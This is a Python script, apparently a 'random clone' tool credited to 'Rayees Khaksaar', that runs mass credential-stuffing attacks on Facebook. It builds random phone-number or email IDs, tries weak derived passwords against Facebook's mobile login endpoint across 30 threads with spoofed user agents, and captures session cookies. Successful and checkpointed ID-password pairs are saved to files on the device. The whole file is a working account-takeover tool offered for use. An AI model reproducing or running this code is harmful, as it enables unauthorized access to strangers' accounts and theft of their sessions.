#Create By: RAYEES KHAKSAAR
#FaceBook: RAYEES KHAKSAAR
#GitHub: https://github.com/Shgsysu/khaksaar420.git
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/MUMIT-404-CYBER')
logo = ("""
\x1b[1;95m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑

     ⠀⠀   ⠀⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠀⢀⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⠀⠀⣠⣴⣦⡄⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀   ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣶⣿⣿⣿⣿⡀⣽⡿⣶⣦⡀⠀⠀⠀⠀⠀
   ⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⣿⣿⣿⣿⣆⠀⠀⠀⠀
   ⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣦⠀⠀⠀
   ⠀⠀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⣿⣿⣿⣿⡿⢟⣿⣷⡀⠀
   ⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣿⣽⣿⣽⣾⣿⣿⣿⠛⠉⠉⠀⢈⣿⣿⡇⠀
   ⠀⠀⠀⢻⣿⣿⠛⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠡⠤⠄⠁⠀⠀⢻⣿⡇⠀
   ⠀⠀⠀⠘⣿⣿⠄⠀⠀⠀⠀⠀⣉⠙⠋⢿⣿⣯⠀⠀⠀✪⠀⠀⣰⣿⣿⡿⡃⠀
   ⠀⠀⠀⠀⢹⣿⣇⣀⠀⠈✪⠉⠁⠀⣤⢠⣿⣿⣧⡆⣤⣤⡀⣾⣿⣿⣿⢠⡇⠀
   ⠀⠀⠀⠀⠀⣿⣿⣿⣷⣤⠄⣀⣴⣧⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠇⠀
   ⠀⠀⠀⠀⠀⠸⣿⣯⠉⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡯⠁⡌⠀⠀
⠀   ⠀⠀⠀⠀⠀⠙⢿⡄⢿⣿⣿⣿⣿⣿⣎⠙⠻⠛⣁⣼⣿⣿⡿⠛⠁⡸⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠉⣿⡿⣿⣿⣿⣿⣷⣬⣿⡿⠟⠋⢀⣴⡞⠁⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⠉⠉⠋⠉⠉⠁⠀⢀⣴⣿⡿⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠿⢃⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;93m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘   
 \033[1;93m 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎𝐎 𝐅𝐑𝐄𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 𝐁𝐘 𝐑𝐀𝐘𝐄𝐄𝐒 𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃‌\x1b[1;90m⟪𒋨⟫══╣\x1b[1;90m[✓] 𝐀𝐔𝐓𝐇𝐎𝐑    \x1b[1;90m: \x1b[1;90m𝐑𝐀𝐘𝐄𝐄𝐒 𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑         
 ┃\033[1;91m⟪𒋨⟫══╣\033[1;91m[✓] 𝐅𝐀𝐂𝐄B𝐎𝐎𝐊\033[1;91:  :\033[1;91m 𝐑𝐀𝐘𝐄𝐄𝐒 𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑              
 ┃\033[1;96m⟪𒋨⟫══╣\033[1;96m[✓] 𝐓𝐎𝐎𝐋      \033[1;91m: \033[1;96m𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐄                
 ┃\033[1;92m⟪𒋨⟫══╣\033[1;92m[✓] 𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;91m: \033[1;92m𝐑𝐀𝐘𝐄𝐄𝐒 𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑 313          
 ┃\x1b[1;94m⟪𒋨⟫══╣\x1b[1;94m[✓] 𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;92m: \x1b[1;94m𝐒𝐇𝐀𝐃𝐎𝐖 𝐎𝐅 𝐃𝐄𝐀𝐓𝐇      
 ┃\033[1;93m⟪𒋨⟫══╣\033[1;93m[✓] 𝐒𝐓𝐀𝐓𝐔𝐒    \x1b[1;94m: \033[1;93m𝐅𝐑𝐄𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒          
 ┃\x1b[1;95m⟪𒋨⟫══╣\x1b[1;95m[✓] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;96m: \x1b[1;95m+93765832093              
 ┃\x1b[1;37m⟪𒋨⟫══╣\x1b[1;37m[✓] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \x1b[1;95m: \x1b[1;37m0.1                 
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" [01] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐍𝐔𝐌𝐁𝐄𝐑 𝐂𝐋𝐎𝐍𝐄")
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" [02] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐄𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐄 ")
        print("\x1b[1;95m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" [00] 𝐄𝐗𝐈𝐓")
        print("\033[1;93m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input(" [?] 𝐂𝐇𝐎𝐎𝐒𝐄 : ")
        print("\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        os.system('xdg-open https://www.facebook.com/khanullah.amiri.5?mibextid=avESrC/')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : 9377, 9378, 9379, 9374, ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : 017, 018, 019, 016, 013, 014 ')
    print("\033[1;96m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] 𝐄𝐍𝐓𝐄𝐑 𝐒𝐈𝐌 𝐂𝐎𝐃𝐄: ')
    print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input(' [?] 𝐂𝐑𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 : '))
    print("\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\x1b[1;90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(' \033[1;91m[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒:\033[1;92m '+tl)
        print("\033[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(' \033[1;92m[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃')
        print("\x1b[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(' \033[1;93m[!] 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐈𝐃𝐒 ')
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(' \x1b[1;95m[!] 𝐔𝐒𝐄 𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝐅𝐎𝐑 𝐒𝐏𝐄𝐄𝐃 𝐔𝐏 ')
        print("\x1b[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m[+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐂𝐎𝐏𝐋𝐄𝐓𝐄𝐃')
    print('\033[1;96m[+] 𝐈𝐃𝐒 𝐒𝐀𝐄𝐃 𝐈𝐍 𝐎𝐊.𝐓𝐗𝐓,𝐂𝐏.𝐓𝐗𝐓')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    print("\x1b[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kode = input(' [?] 𝐓𝐄𝐑𝐆𝐄𝐓 𝐅𝐀𝐒𝐓 𝐍𝐀𝐌𝐄 : ')
    print("\x1b[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    os.system('clear')
    print(logo)
    print("\033[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kodex = input(' [?] 𝐓𝐄𝐑𝐆𝐄𝐓 𝐋𝐒𝐓 𝐍𝐀𝐌𝐄 :  ')
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    os.system('clear')
    print(logo)
    print("\x1b[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : @gmail.com, @yahoo.com ')
    print("\x1b[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input(' [?] 𝐓𝐄𝐑𝐆𝐄𝐓 𝐃𝐎𝐀𝐌𝐈𝐍 : ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    os.system('clear')
    print(logo)
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [+] 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : 3000, 5000, 10000, 50000 ')
    print("\x1b[1;90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[?] 𝐂𝐑𝐀𝐂𝐊 𝐋𝐈𝐌𝐈𝐓 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\x1b[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(' \x1b[1;90m[+] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒:\033[1;92m '+tl)
        print(' \033[1;91m[+] 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃')
        print(' \033[1;96m[!] 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐈𝐃𝐒 ')
        print(' \033[1;92m[!] 𝐔𝐒𝐄 𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝐅𝐎𝐑 𝐒𝐏𝐄𝐄𝐃 𝐔𝐏 ')
        print("\x1b[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m[+] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐂𝐎𝐏𝐋𝐄𝐓𝐄𝐃')
    print('\x1b[1;37m[+] 𝐈𝐃𝐒 𝐒𝐀𝐄𝐃 𝐈𝐍 𝐎𝐊.𝐓𝐗𝐓,𝐂𝐏.𝐓𝐗𝐓')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92m𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑\033[1;97m] > [%s/%s] > [𝐎𝐊\033[1;97m:-\033[1;92m%s\033[1;97m] - [𝐂𝐏\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
    'method': 'POST',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,fa-AF;q=0.8,fa;q=0.7',
    'cache-control': 'max-age=0',   
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑-𝐎𝐊🇦🇫♥] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑-𝐂𝐏🇦🇫♥] {cid} | {ps}")
                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[𝐊𝐇𝐀𝐊𝐒𝐀𝐀𝐑♥] \033[1;92m%s\033[m |\033[m[\033[𝐎𝐊:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()
